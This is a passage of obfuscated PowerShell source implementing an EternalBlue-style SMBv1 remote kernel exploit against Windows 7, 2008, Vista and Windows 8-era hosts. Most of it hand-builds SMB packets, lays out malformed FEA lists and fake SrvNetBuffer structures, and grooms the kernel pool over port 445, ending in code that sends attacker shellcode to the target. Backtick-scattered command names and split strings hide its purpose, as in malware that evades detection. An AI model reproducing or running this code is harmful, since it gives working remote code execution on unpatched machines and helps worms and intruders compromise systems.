$pkt += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += 0xff,0xff
$pkt += 0x2F,0x4B
$pkt += 0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x00
$pkt += 0x0c,0x00
$pkt += 0x02
$pkt += 0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00
return $pkt
}
function smb_header($smbheader) {
$parsed_header =@{server_component=$smbheader[0..3];
smb_command=$smbheader[4];
error_class=$smbheader[5];
reserved1=$smbheader[6];
error_code=$smbheader[6..7];
flags=$smbheader[8];
flags2=$smbheader[9..10];
process_id_high=$smbheader[11..12];
signature=$smbheader[13..21];
reserved2=$smbheader[22..23];
tree_id=$smbheader[24..25];
process_id=$smbheader[26..27];
user_id=$smbheader[28..29];
multiplex_id=$smbheader[30..31];
}
return $parsed_header
}
function smb1_get_response($sock){
$tcp_response = [Array]::CreateInstance(('b'+'yte'), 1024)
try{
$sock.Receive($tcp_response)| O`U`T-NULl
}
catch {
}
$netbios = $tcp_response[0..4]
$smb_header = $tcp_response[4..36]
$parsed_header = smB_h`e`ADeR($smb_header)
return $tcp_response, $parsed_header
}
function client_negotiate($sock){
$raw_proto = n`egOtiaT`e_Pr`ot`o_R`EQUEst
$sock.Send($raw_proto) | OuT`-n`ULL
return sM`B1_`geT_`REsponSe($sock)
}
function tree_connect_andx($sock, $target, $userid){
$raw_proto = tr`eE_cO`Nn`ECT_an`d`X_R`EQUEST $target $userid
$sock.Send($raw_proto) | ou`T-nULl
return sM`B1`_get_`Respo`Nse($sock)
}
function tree_connect_andx_request($target, $userid) {
[Byte[]] $pkt = [Byte[]](0x00)
$pkt +=0x00,0x00,0x48
$pkt +=0xFF,0x53,0x4D,0x42
$pkt +=0x75
$pkt +=0x00,0x00,0x00,0x00
$pkt +=0x18
$pkt +=0x01,0x48
$pkt +=0x00,0x00
$pkt +=0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
$pkt +=0x00,0x00
$pkt +=0xff,0xff
$pkt +=0x2F,0x4B
$pkt += $userid
$pkt +=0x00,0x00
$ipc = (('SW'+'0SW0') -rePLACe'SW0',[Char]92)+ $target + "\IPC$"
$pkt +=0x04
$pkt +=0xFF
$pkt +=0x00
$pkt +=0x00,0x00
$pkt +=0x00,0x00
$pkt +=0x01,0x00
$al=[system.Text.Encoding]::ASCII.GetBytes($ipc).Count+8
$pkt+=[bitconverter]::GetBytes($al)[0],0x00
$pkt +=0x00
$pkt += [system.Text.Encoding]::ASCII.GetBytes($ipc)
$pkt += 0x00
$pkt += 0x3f,0x3f,0x3f,0x3f,0x3f,0x00
$len = $pkt.Length - 4
$hexlen = [bitconverter]::GetBytes($len)[-2..-4]
$pkt[1] = $hexlen[0]
$pkt[2] = $hexlen[1]
$pkt[3] = $hexlen[2]
return $pkt
}
function smb1_anonymous_connect_ipc($target){
$client = NE`W-`obj`EcT System.Net.Sockets.TcpClient($target,445)
$sock = $client.Client
C`liEnt`_n`egO`TiATe($sock) | O`Ut-`NuLl
$raw, $smbheader = Sm`B`1_A`NONyMO`US_LOgIN $sock
$raw, $smbheader = TrEe_c`O`N`N`eCT_aNDX $sock $target $smbheader.user_id
return $smbheader, $sock
}
function make_smb1_nt_trans_packet($tree_id, $user_id) {
[Byte[]] $pkt = [Byte[]] (0x00)
$pkt += 0x00,0x08,0x3C
$pkt += 0xff,0x53,0x4D,0x42
$pkt += 0xa0
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x18
$pkt += 0x01,0x48
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += $tree_id
$pkt += 0x2f,0x4b
$pkt += $user_id
$pkt += 0x00,0x00
$pkt += 0x14
$pkt += 0x01
$pkt += 0x00,0x00
$pkt += 0x1e,0x00,0x00,0x00
$pkt += 0x16,0x00,0x01,0x00
$pkt += 0x1e,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x1e,0x00,0x00,0x00
$pkt += 0x4c,0x00,0x00,0x00
$pkt += 0xd0,0x07,0x00,0x00
$pkt += 0x6c,0x00,0x00,0x00
$pkt += 0x01
$pkt += 0x00,0x00
$pkt += 0x00,0x00
$pkt += 0xf1,0x07
$pkt += 0xff
$pkt += [Byte[]] (0x00) * 0x1e
$pkt += 0xff,0xff,0x00,0x00,0x01
$pkt += [Byte[]](0x00) * 0x7CD
return $pkt
}
function make_smb1_trans2_exploit_packet($tree_id, $user_id, $data, $timeout) {
$timeout = ($timeout * 0x10) + 7
[Byte[]] $pkt = [Byte[]] (0x00)
$pkt += 0x00,0x10,0x38
$pkt += 0xff,0x53,0x4D,0x42
$pkt += 0x33
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x18
$pkt += 0x01,0x48
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += $tree_id
$pkt += 0x2f,0x4b
$pkt += $user_id
$pkt += 0x00,0x00
$pkt += 0x09
$pkt += 0x00,0x00
$pkt += 0x00,0x10
$pkt += 0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x00
$pkt += 0x00
$pkt += 0x00,0x10
$pkt += 0x38,0x00,0xd0
$pkt += [bitconverter]::GetBytes($timeout)[0]
$pkt += 0x00,0x00
$pkt += 0x03,0x10
$pkt += 0xff,0xff,0xff
$pkt +=$data
$len = $pkt.Length - 4
$hexlen = [bitconverter]::GetBytes($len)[-2..-4]
$pkt[1] = $hexlen[0]
$pkt[2] = $hexlen[1]
$pkt[3] = $hexlen[2]
return $pkt
}
function make_smb1_trans2_last_packet($tree_id, $user_id, $data, $timeout) {
$timeout = ($timeout * 0x10) + 7
[Byte[]] $pkt = [Byte[]] (0x00)
$pkt += 0x00,0x08,0x7e
$pkt += 0xff,0x53,0x4D,0x42
$pkt += 0x33
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x18
$pkt += 0x01,0x48
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += $tree_id
$pkt += 0x2f,0x4b
$pkt += $user_id
$pkt += 0x00,0x00
$pkt += 0x09
$pkt += 0x00,0x00
$pkt += 0x46,0x08
$pkt += 0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x00
$pkt += 0x00
$pkt += 0x46,0x08
$pkt += 0x38,0x00,0xd0
$pkt += [bitconverter]::GetBytes($timeout)[0]
$pkt += 0x00,0x00
$pkt += 0x49,0x08
$pkt += 0xff,0xff,0xff
$pkt +=$data
$len = $pkt.Length - 4
$hexlen = [bitconverter]::GetBytes($len)[-2..-4]
$pkt[1] = $hexlen[0]
$pkt[2] = $hexlen[1]
$pkt[3] = $hexlen[2]
return $pkt
}
function send_big_trans2($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk){
$nt_trans_pkt = m`A`kE_sMB1_`N`T_TRAn`s`_pAckEt $smbheader.tree_id $smbheader.user_id
$sock.Send($nt_trans_pkt) | O`Ut-nULl
$raw, $transheader = sMb1_G`eT_ResPo`N`sE($sock)
$i=$firstDataFragmentSize
$timeout=0
while ($i -lt $data.count)
{
$sendSize=[System.Math]::Min(4096,($data.count-$i))
if (($data.count-$i) -le 4096){
if (!$sendLastChunk)
{ break }
}
$trans2_pkt = MA`k`E_SmB1_Tr`A`Ns2_EXpl`o`It_`PAcKET $smbheader.tree_id $smbheader.user_id $data[$i..($i+$sendSize-1)] $timeout
$sock.Send($trans2_pkt) | OuT`-nUll
$timeout+=1
$i +=$sendSize
}
if ($sendLastChunk)
{Smb`1_`GeT_ReSPo`NsE($sock) }
return $i,$timeout
}
function createSessionAllocNonPaged($target, $size) {
$client = n`Ew-O`B`JECT System.Net.Sockets.TcpClient($target,445)
$sock = $client.Client
CL`i`E`Nt_N`EgotiATE($sock) | O`U`T-Null
$flags2=16385
if ($size -ge 0xffff)
{ $reqsize=$size /2}
else
{
$flags2 =49153
$reqsize= $size
}
if($flags2 -eq 49153) {
$pkt = makE`_SmB`1_`FRee_hOlE_SEs`si`on`_P`ACKeT (0x01,0xc0) (0x02,0x00) (0xf0,0xff,0x00,0x00,0x00)
}
else {
$pkt = m`AKE_smB1_f`RE`e_hO`l`E_sESsiO`N_P`A`cK`eT (0x01,0x40) (0x02,0x00) (0xf8,0x87,0x00,0x00,0x00)
}
$sock.Send($pkt) | OUt-`Nu`Ll
sMb1_`GEt_R`eSp`ONSE($sock) | oUt`-N`ULl
return $sock
}
function make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) {
[Byte[]] $pkt = 0x00
$pkt += 0x00,0x00,0x51
$pkt += 0xff,0x53,0x4D,0x42
$pkt += 0x73
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x18
$pkt += $flags2
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += 0xff,0xff
$pkt += 0x2f,0x4b
$pkt += 0x00,0x00
$pkt += 0x40,0x00
$pkt += 0x0c
$pkt += 0xff
$pkt += 0x00
$pkt += 0x00,0x00
$pkt += 0x00,0xf0
$pkt += 0x02,0x00
$pkt += $vcnum
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x80
$pkt += 0x16,0x00
$pkt += $native_os
$pkt += [Byte[]] (0x00) * 17
return $pkt
}
function smb2_grooms($target, $grooms, $payload_hdr_pkt, $groom_socks){
for($i =0; $i -lt $grooms; $i++)
{
$client = neW-o`B`jEct System.Net.Sockets.TcpClient($target,445)
$gsock = $client.Client
$groom_socks += $gsock
$gsock.Send($payload_hdr_pkt) | O`Ut-`NuLl
}
return $groom_socks
}
function make_smb2_payload_headers_packet(){
[Byte[]] $pkt = [Byte[]](0x00,0x00,0xff,0xf7,0xFE) + [system.Text.Encoding]::ASCII.GetBytes(('S'+'MB')) + [Byte[]](0x00)*124
return $pkt
}
function eb7($target ,$shellcode) {
$NTFEA_SIZE = 0x11000
$ntfea10000=0x00,0x00,0xdd,0xff+[byte[]]0x41*0xffde
$ntfea11000 =(0x00,0x00,0x00,0x00,0x00)*600
$ntfea11000 +=0x00,0x00,0xbd,0xf3+[byte[]]0x41*0xf3be
$ntfea1f000=(0x00,0x00,0x00,0x00,0x00)*0x2494
$ntfea1f000=0x00,0x00,0xed,0x48+0x41*0x48ee
$ntfea=@{0x10000=$ntfea10000;0x11000=$ntfea11000}
$TARGET_HAL_HEAP_ADDR_x64 = 0xffffffffffd00010
$TARGET_HAL_HEAP_ADDR_x86 = 0xffdff000
[byte[]]$fakeSrvNetBufferNsa = @(0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0xf0,0xdf,0xff,0x00,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x80,0xef,0xdf,0xff,0x00,0x00,0x00,0x00,0x10,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0x10,0x01,0xd0,0xff,0
xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0xff,0xcf,0xff,0xff,0xff,0xff,0xff)
[byte[]]$fakeSrvNetBufferX64 = @(0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0x10,0x01,0xd0,0xff,0
xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0xff,0xcf,0xff,0xff,0xff,0xff,0xff)
$fakeSrvNetBuffer = $fakeSrvNetBufferNsa
[byte[]]$feaList=[byte[]](0x00,0x00,0x01,0x00)
$feaList += $ntfea[$NTFEA_SIZE]
$feaList +=0x00,0x00,0x8f,0x00+ $fakeSrvNetBuffer
$feaList +=0x12,0x34,0x78,0x56
[byte[]]$fake_recv_struct=@(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0
x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0
0,0x00,0x00,0x00,0x00,0x00,0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0xf0,0xdf,0xff,0xc0,0xf0,0xdf,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x
00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0
x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0xef,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0
0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xf0,0x01,0xd0,
0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0x01,0xd0,0xff,0xff,0xff,0xff,0xff)
$client = n`Ew-oBj`EcT System.Net.Sockets.TcpClient($target,445)
$sock = $client.Client
$sock.ReceiveTimeout =5000
clIe`NT_N`E`GoTI`Ate($sock) | out-`NulL
$raw, $smbheader = sm`B`1_`AnONYmOu`S`_loG`In $sock
$os=[system.Text.Encoding]::ascii.GetString($raw[45..($raw.count-1)]).ToLower()

if (!(($os.contains(('windows'+' '+'7'))) -or ($os.contains(('wi'+'nd'+'ows')) -and $os.contains(('200'+'8'))) -or ($os.contains(('w'+'indo'+'w'+'s vi'+'sta'))) -or ($os.contains(('wind'+'o'+'ws')) -and $os.contains(('201'+'1')))))
{return $False}
$raw, $smbheader = t`Ree_co`N`NECt_AnDx $sock $target $smbheader.user_id

$progress , $timeout= Se`N`d`_B`Ig_tRanS2 $sock $smbheader $feaList 2000 $False
$allocConn = CReA`T`EsES`SIONaL`loCnon`pagEd $target ($NTFEA_SIZE - 0x1010)
$payload_hdr_pkt = mAkE`_smb2`_paYlOad_HE`AdE`RS_`Pa`cKEt
$groom_socks =@()
for ($i=0; $i -lt 13; $i++)
{
$client = n`ew-Ob`jE`ct System.Net.Sockets.TcpClient($target,445)
$gsock = $client.Client
$groom_socks += $gsock
$gsock.Send($payload_hdr_pkt) | oUt`-n`ULL
}
$holeConn = Cr`EAteseSs`i`o`N`ALLoc`N`Onp`AGEd $target ($NTFEA_SIZE - 0x10)
$allocConn.close()
for ($i=0; $i -lt 5; $i++)
{
$client = n`Ew-oBj`ecT System.Net.Sockets.TcpClient($target,445)
$gsock = $client.Client
$groom_socks += $gsock
$gsock.Send($payload_hdr_pkt) | OUT-NU`lL
}
$holeConn.close()
$trans2_pkt = maKe`_Smb1`_Tran`S2_lasT`_PAc`KET $smbheader.tree_id $smbheader.user_id $feaList[$progress..$feaList.count] $timeout
$sock.Send($trans2_pkt) | o`UT-n`ULl
$raw, $trans2header = sMB`1`_gET_resp`O`Nse($sock)
foreach ($sk in $groom_socks)
{
$sk.Send($fake_recv_struct + $shellcode) | O`UT-N`Ull
}
foreach ($sk in $groom_socks)
{
$sk.close() | o`Ut-`NUlL
}
$sock.Close()| Ou`T-NulL
return $True
}

function createFakeSrvNetBuffer8($sc_size)
{
    $totalRecvSize = 0x80 + 0x180 + $sc_size
	$fakeSrvNetBufferX64 = [byte[]]0x00*16
	$fakeSrvNetBufferX64 += 0xf0,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff
	$fakeSrvNetBufferX64 += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xe8,0x82,0x00,0x00,0x00,0x00,0x00,0x00
	$fakeSrvNetBufferX64 +=  [byte[]]0x00*16
    $a=[bitconverter]::GetBytes($totalRecvSize)
	$fakeSrvNetBufferX64 += [byte[]]0x00*8+$a+[byte[]]0x00*4
	$fakeSrvNetBufferX64 += 0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff
	$fakeSrvNetBufferX64 += [byte[]]0x00*48
	$fakeSrvNetBufferX64 += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00
	$fakeSrvNetBufferX64 += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x3f,0xd0,0xff,0xff,0xff,0xff,0xff
	return $fakeSrvNetBufferX64
}

function createFeaList8($sc_size, $ntfea){
	$feaList = 0x00,0x00,0x01,0x00
	$feaList += $ntfea
	$fakeSrvNetBuf = CreateFAKEsRv`N`et`BuFfeR8($sc_size)
    $a=[bitconverter]::GetBytes($fakeSrvNetBuf.Length-1)
	$feaList += 0x00,0x00,$a[0],$a[1] + $fakeSrvNetBuf 
	$feaList += 0x12,0x34,0x78,0x56
	return $feaList
}

function  make_smb1_login8_packet8 {
    [Byte[]] $pkt = [Byte[]] (0x00) 
    $pkt += 0x00,0x00,0x88 
    $pkt += 0xff,0x53,0x4D,0x42
    $pkt += 0x73
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x18 
    $pkt += 0x01,0x48 
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00
    $pkt += 0xff,0xff
    $pkt += 0x2f,0x4b 
    $pkt += 0x00,0x00 
    $pkt += 0x00,0x00       
    $pkt += 0x0c               
    $pkt += 0xff           
    $pkt += 0x00               
    $pkt += 0x00,0x00      
    $pkt += 0x00,0xf0     
    $pkt += 0x02,0x00   
    $pkt += 0x01,0x00  
    $pkt += 0x00,0x00,0x00,0x00  
	$pkt += 0x42,0x00,0x00,0x00,0x00,0x00 
	$pkt += 0x44,0xc0,0x00,0x80	
	$pkt += 0x4d,0x00	
	$pkt += 0x60,0x40,0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02,0xa0,0x36,0x30,0x34,0xa0,0x0e,0x30,0x0c,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a,0xa2,0x22,0x04,0x20,0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x01,0x00,0x00,0x00,0x05,0x02,0x88,0xa0,0x00,0x0
0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
    $pkt += 0x55,0x6e,0x69,0x78,0x00       
    $pkt += 0x53,0x61,0x6d,0x62,0x61,0x00
    return $pkt
}
function  make_ntlm_auth_packet8($user_id) {
    [Byte[]] $pkt = [Byte[]] (0x00)    
    $pkt += 0x00,0x00,0x96          
    $pkt += 0xff,0x53,0x4D,0x42      
    $pkt += 0x73               
    $pkt += 0x00,0x00,0x00,0x00  
    $pkt += 0x18          
    $pkt += 0x01,0x48          
    $pkt += 0x00,0x00       
    $pkt += 0x00,0x00,0x00,0x00  
    $pkt += 0x00,0x00,0x00,0x00  
    $pkt += 0x00,0x00      
    $pkt += 0xff,0xff    
    $pkt += 0x2f,0x4b  
    $pkt += $user_id    
    $pkt += 0x00,0x00   
    $pkt += 0x0c     
    $pkt += 0xff      
    $pkt += 0x00            
    $pkt += 0x00,0x00         
    $pkt += 0x00,0xf0            
    $pkt += 0x02,0x00        
    $pkt += 0x01,0x00     
    $pkt += 0x00,0x00,0x00,0x00    
	$pkt += 0x50,0x00,0x00,0x00,0x00,0x00 
	$pkt += 0x44,0xc0,0x00,0x80		
	$pkt += 0x5b,0x00			
	$pkt += 0xa1,0x4e,0x30,0x4c,0xa2,0x4a,0x04,0x48,0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x0
0,0x08,0x00,0x08,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x05,0x02,0x88,0xa0,0x4e,0x00,0x55,0x00,0x4c,0x00,0x4c,0x00
    				
    $pkt += 0x55,0x6e,0x69,0x78,0x00  
    $pkt += 0x53,0x61,0x6d,0x62,0x61,0x00
    return $pkt
}
function smb1_login8($sock){
    $raw_proto = maKe_smB`1_`L`oGIn8`_PAC`ke`T8
    $sock.Send($raw_proto) | OU`T`-NulL
    $raw, $smbheader=SMb`1_Ge`T_Re`sp`O`NsE8($sock)
    $raw_proto = mA`K`E`_nTlM_`AU`TH_pACKE`T8($smbheader.user_id)
    $sock.Send($raw_proto) | OU`T-`Null
    return Sm`B1_g`eT_Re`Sp`ON`SE8($sock)
    

}
function negotiate_proto_request8($use_ntlm)
{ 
      [Byte[]]  $pkt = [Byte[]] (0x00)         
      $pkt += 0x00,0x00,0x2f     
      $pkt += 0xFF,0x53,0x4D,0x42 
      $pkt += 0x72            
      $pkt += 0x00,0x00,0x00,0x00 
      $pkt += 0x18           
      if($use_ntlm){ $pkt +=  0x01,0x48 }
      else{ $pkt +=  0x01,0x40 }         
      $pkt += 0x00,0x00       
      $pkt += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 
      $pkt += 0x00,0x00      
      $pkt += 0xff,0xff    
      $pkt += 0x2F,0x4B        
      $pkt += 0x00,0x00    
      $pkt += 0x00,0x00      
      $pkt += 0x00        
      $pkt += 0x0c,0x00       
      $pkt += 0x02           
      $pkt += 0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00   
      return $pkt
}
function smb_header8($smbheader) {
$parsed_header =@{server_component=$smbheader[0..3];
                  smb_command=$smbheader[4];
                  error_class=$smbheader[5];
                  reserved1=$smbheader[6];
                  error_code=$smbheader[7..8];
                  flags=$smbheader[9];
                  flags2=$smbheader[10..11];
                  process_id_high=$smbheader[12..13];
                  signature=$smbheader[14..21];
                  reserved2=$smbheader[22..23];
                  tree_id=$smbheader[24..25];
                  process_id=$smbheader[26..27];
                  user_id=$smbheader[28..29];
                  multiplex_id=$smbheader[30..31];
                 }
return $parsed_header
}

function smb1_get_response8($sock){
    $sock.ReceiveTimeout =5000
    $tcp_response = [Array]::CreateInstance(('byt'+'e'), 1024)
    try{
    $sock.Receive($tcp_response)| OUt-NU`ll
     }
     catch {
      return -1,-1
     }
    $netbios = $tcp_response[0..4]
    $smb_header8 = $tcp_response[4..36]  
    $parsed_header = S`M`B_HeAde`R8($smb_header8)  
    return $tcp_response, $parsed_header

}


function client_negotiate8($sock , $use_ntlm){
    $raw_proto = Negot`Ia`TE_P`ROT`O_requEST8($use_ntlm)
    $sock.Send($raw_proto) | out`-`NulL
    return smb1_g`eT_r`ES`Pon`se8($sock)

}
function tree_connect_andx8($sock, $target, $userid){
    $raw_proto = tr`Ee_conneCT_aN`Dx`8_R`eQuESt $target $userid
    $sock.Send($raw_proto) | OUT-Nu`lL
   return S`Mb1_Get_`Re`s`pon`se8($sock)
}
function tree_connect_andx8_request($target, $userid) { 

     [Byte[]] $pkt = [Byte[]](0x00)            
     $pkt +=0x00,0x00,0x48       
     $pkt +=0xFF,0x53,0x4D,0x42  
     $pkt +=0x75            
     $pkt +=0x00,0x00,0x00,0x00  
     $pkt +=0x18             
     $pkt +=0x01,0x48         
     $pkt +=0x00,0x00          
     $pkt +=0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 
     $pkt +=0x00,0x00         
     $pkt +=0xff,0xff        
     $pkt +=0x2F,0x4B        
     $pkt += $userid           
     $pkt +=0x00,0x00      
    $ipc = (('waJwaJ').replACE('waJ',[StrInG][CHar]92))+ $target + "\IPC$"
     $pkt +=0x04              
     $pkt +=0xFF             
     $pkt +=0x00             
     $pkt +=0x00,0x00       
     $pkt +=0x00,0x00        
     $pkt +=0x01,0x00      
	 $al=[system.Text.Encoding]::ASCII.GetBytes($ipc).Count+8
	 $pkt+=[bitconverter]::GetBytes($al)[0],0x00
     $pkt +=0x00              
     $pkt += [system.Text.Encoding]::ASCII.GetBytes($ipc) 
     $pkt += 0x00       
     $pkt += 0x3f,0x3f,0x3f,0x3f,0x3f,0x00 
	$len = $pkt.Length - 4
	$hexlen = [bitconverter]::GetBytes($len)[-2..-4]
	$pkt[1] = $hexlen[0]
	$pkt[2] = $hexlen[1]
	$pkt[3] = $hexlen[2]
    return $pkt
    }

function make_smb1_nt_trans_packet8($tree_id, $user_id) { 

    [Byte[]]  $pkt = [Byte[]] (0x00)                 
    $pkt += 0x00,0x08,0x3C           
    $pkt += 0xff,0x53,0x4D,0x42       
    $pkt += 0xa0                
    $pkt += 0x00,0x00,0x00,0x00      
    $pkt += 0x18   
    $pkt += 0x01,0x48
    $pkt += 0x00,0x00 
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00 
    $pkt += 0x00,0x00
    $pkt += $tree_id 
    $pkt += 0x2f,0x4b 
    $pkt += $user_id  
    $pkt += 0x00,0x00 

    $pkt += 0x14           
    $pkt += 0x01          
    $pkt += 0x00,0x00  
    $pkt += 0x1e,0x00,0x00,0x00 
